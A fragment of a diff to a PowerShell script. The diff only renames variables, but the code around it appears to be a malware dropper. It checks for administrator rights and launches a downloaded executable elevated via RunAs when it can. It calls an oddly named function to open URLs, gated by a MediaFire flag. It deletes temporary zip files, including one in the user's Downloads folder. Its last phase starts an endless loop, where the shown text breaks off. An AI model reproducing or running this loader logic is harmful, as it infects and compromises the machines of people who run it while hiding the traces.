@@ -111,7 +111,7 @@ if($null -ne $subZip -and(Test-Path -LiteralPath $subZip.FullName)){Remove-Item 
 if($null -ne $targetExtractPath -and(Test-Path -LiteralPath $targetExtractPath)){Remove-Item -LiteralPath $targetExtractPath -Recurse -Force -ErrorAction SilentlyContinue}
 Write-Host "Workflow completed successfully!"
 }
-$runExe=$true;$mediaFire=$true;$phase2=$true;$phase3=$true;
+$runExe=$true;$mediaFire=$true;$p2=$true;$p3=$true;
 if(!($mediaFire) -and !($openUrl)){[Environment]::Exit(0)}
 $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if($isAdmin){
@@ -159,7 +159,7 @@ Write-Host "Starting $exePath"
 if($isAdmin){Start-Process -FilePath $exePath -Verb RunAs}else{Start-Process -FilePath $exePath}
 }else{Write-Host "Skipping EXE launch."}
 }
-if($phase2){DarwinWaterson}else{Write-Host "Skipping Url launch."}
+if($p2){DarwinWaterson}else{Write-Host "Skipping Url launch."}
 Write-Host "Performing final cleanup of temporary archive files..."
 $tempZips=Get-ChildItem -Path $tempPath -Filter "*.zip" -ErrorAction SilentlyContinue
 $downloadZip=Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\download.zip"
@@ -175,7 +175,7 @@ break
 }
 }
 }
-if($phase3){
+if($p3){
 $count = 18
 $command = '
 while($true){
